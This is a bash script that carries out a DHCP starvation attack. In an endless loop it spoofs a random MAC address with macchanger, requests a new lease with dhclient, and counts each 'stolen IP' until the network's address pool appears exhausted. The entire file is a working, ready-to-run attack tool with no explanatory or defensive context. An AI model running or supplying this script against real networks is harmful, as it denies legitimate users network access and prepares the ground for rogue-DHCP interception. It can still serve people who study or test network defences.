#!/bin/bash

if [[ -z $1 ]]; then
   interface='eth0'
else
   interface=$1
fi

if [ ! -L "/sys/class/net/${interface}" ]
then
      echo "ERROR : Unknown network interface : ${interface}"

      echo -n "         network interfaces : "
      find /sys/class/net/ -maxdepth 1 -type l -printf '%f '
      echo

      exit 1
fi

if [ -z $(which macchanger) ]
then
      echo "ERROR : The tool 'macchanger' is not installed"
      exit 2
fi

if (( EUID ))
then
      echo "ERROR : This program must be run with the root rights"
      exit 3
fi

PIDFile="/tmp/dhcp-starvation.dhclient.${interface}.pid"
LEASEFile="/tmp/dhcp-starvation.dhclient.${interface}.lease"
CONFIGFile="/tmp/dhcp-starvation.dhclient.conf"

echo 'initial-interval 1;' > "${CONFIGFile}"

rm -f "${PIDFile}"

NumberAddress=1
NumberStolenIP=0

while true; do
      # We kill every dhclient process
      if [ -e "${PIDFile}" ]
      then
         PID=$(cat "${PIDFile}")
         kill "${PID}"
         while kill -0 "${PID}" 2>/dev/null; do
            sleep 1
         done
      fi
      rm -f "${PIDFile}" "${LEASEFile}"

      # We disable our interface
      ip link set "${interface}" down
      #ifconfig "${interface}" down

      ip add flush "${interface}"
      #ifconfig "${interface}" 0.0.0.0

      echo -n "$((NumberAddress++))] "
      # We switch our MAC address for out interface
      macchanger -a "${interface}" | grep '^New MAC:'

      # We enable again our interface
      ip link set "${interface}" up
      #ifconfig "${interface}" up

      # We get a new DHCP Lease
      if ! dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
      then
         echo "dhcp pool perhaps empty (${NumberStolenIP} stolen IP) !!!!"
      else
         ((NumberStolenIP++))
      fi

      sleep 1s
done
